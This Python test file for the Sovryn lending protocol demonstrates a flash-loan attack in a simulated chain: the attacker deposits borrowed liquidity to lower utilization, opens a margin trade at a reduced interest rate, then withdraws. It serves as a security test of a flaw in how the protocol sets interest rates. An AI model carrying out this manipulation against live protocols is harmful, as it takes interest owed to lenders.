# please save this file as:
# tests/loanToken/trading/test_flash_loan_lower_interest.py
# run test with command:
# npx brownie test tests/loanToken/trading/test_flash_loan_lower_interest.py

def test_margin_trading_sending_loan_tokens(accounts, sovryn, loanToken, SUSD, WRBTC, priceFeeds, chain, SOV, FeesEvents):

    underlyingToken = SUSD
    collateralToken = WRBTC

    # preparation
    print('PREPARATION')
    # amount to be sent for margin trade
    print('# amount to be sent for margin trade')
    loan_token_sent = 1e18
    print('loan_token_sent', loan_token_sent)
    # legitimate users add liquidity to the loan token
    print('# legitimate users add liquidity to the loan token')
    baseLiquidity = int(1.1*loan_token_sent)
    print('baseLiquidity', baseLiquidity)
    underlyingToken.mint(accounts[1], baseLiquidity)
    underlyingToken.approve(loanToken.address,baseLiquidity, {"from":accounts[1]})
    loanToken.mint(accounts[1], baseLiquidity, {"from":accounts[1]})

    # sets up interest rates
    baseRate = 1e18
    rateMultiplier = 20.25e18
    targetLevel=80*10**18 #60*10**18
    kinkLevel=90*10**18 #80*10**18
    maxScaleRate=100*10**18
    loanToken.setDemandCurve(baseRate, rateMultiplier, baseRate, rateMultiplier, targetLevel, kinkLevel, maxScaleRate)
    borrowInterestRate = loanToken.borrowInterestRate()
    print("base borrow interest rate (not adjusted by utilization): ", borrowInterestRate/1e18)

    print("First trade, without the attack strategy")
    underlyingToken.mint(accounts[0], loan_token_sent)
    underlyingToken.approve(loanToken.address, loan_token_sent)
    # send the margin trade transaction
    leverage_amount = 1e18
    collateral_sent = 0
    tx = loanToken.marginTrade(
        "0", #loanId  (0 for new loans)
        leverage_amount, # leverageAmount
        loan_token_sent, #loanTokenSent
        collateral_sent, # no collateral token sent
        collateralToken.address, #collateralTokenAddress
        accounts[0], #trader,
        b'', #loanDataBytes (only required with ether)
        {'value': 0}
    )

    loan_id = tx.events['Trade']['loanId']
    positionSize = tx.events['Trade']['positionSize']
    loan = sovryn.getLoan(loan_id).dict()

    # interest paid per day is high because of high utilization rate.
    print("interest per day (without attack)", loan['interestOwedPerDay']/1e15,"*1e15")
    # assert(loan['interestOwedPerDay'] == 1.791692822766267e15)
    assert(loan['interestOwedPerDay'] == 0.740444139368745e15)

    # repays loan (so that the tokens are there to be loaned again)
    sovryn.closeWithSwap(loan_id, accounts[0], positionSize, False, "")

    # now do the same loan again, but use a flash loan to lower interest.

    # amount attacker will get in flash loan
    # that means attacker can borrow at the base rate,
    # regardless of actual utilization rate
    # by temporarily lowering utilization rate with a flash loan
    # from a third-party
    flashLoanAmount = int(100 * loan_token_sent)

    # we simulate the flash loan by minting tokens to the attacker account
    # the attacker already owns loan_token_sent before the loan
    # begin flash loan attack:
    underlyingToken.mint(accounts[0], loan_token_sent + flashLoanAmount)
    underlyingToken.approve(loanToken.address, loan_token_sent + flashLoanAmount)

    # deposits to the loan token
    loanToken.mint(accounts[0], flashLoanAmount)

    print("reepating the trade but with the attack flash loan")

    # sets up interest rates
    baseRate = 1e18
    rateMultiplier = 20.25e18
    targetLevel=80*10**18 #90*10**18
    kinkLevel=90*10**18 #80*10**18
    maxScaleRate=100*10**18
    loanToken.setDemandCurve(baseRate,rateMultiplier,baseRate,rateMultiplier, targetLevel, kinkLevel, maxScaleRate)
    borrowInterestRate = loanToken.borrowInterestRate()
    print("base borrow interest rate (not adjusted by utilization): ",borrowInterestRate/1e18)

    # send the margin trade transaction
    leverage_amount = 1e18
    collateral_sent = 0
    tx = loanToken.marginTrade(
        "0", #loanId  (0 for new loans)
        leverage_amount, # leverageAmount
        loan_token_sent, #loanTokenSent
        collateral_sent, # no collateral token sent
        collateralToken.address, #collateralTokenAddress
        accounts[0], #trader,
        b'', #loanDataBytes (only required with ether)
        {'value': 0}
    )

    loan_id = tx.events['Trade']['loanId']
    positionSize = tx.events['Trade']['positionSize']
    loan = sovryn.getLoan(loan_id).dict()

    # interest paid per day is lower than without flash loan
    print("interest per day (with attack)", loan['interestOwedPerDay']/10**15,"*1e15")
    # assert(loan['interestOwedPerDay'] == 0.36394533347356e15)
    assert(loan['interestOwedPerDay'] == 0.477533704995224e15)

    borrowInterestRate = loanToken.borrowInterestRate()
    print("base borrow interest rate (adjusted by utilization) * 10**18: ", borrowInterestRate/10**18)

    print("flashLoanAmount * 10**18: ", flashLoanAmount/10**18)

    # withdraws from the loan token
    print("loanToken.balanceOf(accounts[0]): ", loanToken.balanceOf(accounts[0]))
    fldiff = flashLoanAmount - loanToken.balanceOf(accounts[0])
    print("flashLoanAmount - loanToken.balanceOf(accounts[0]) after trading: ", fldiff)
    loanToken.burn(accounts[0], flashLoanAmount - fldiff)
    

    # simulates repaying flash loan
    print("loanToken.balanceOf(accounts[0]): ", underlyingToken.balanceOf(accounts[0]))
    underlyingToken.burn(accounts[0], flashLoanAmount)

    # uncommment to see all the output
    # assert(true == false)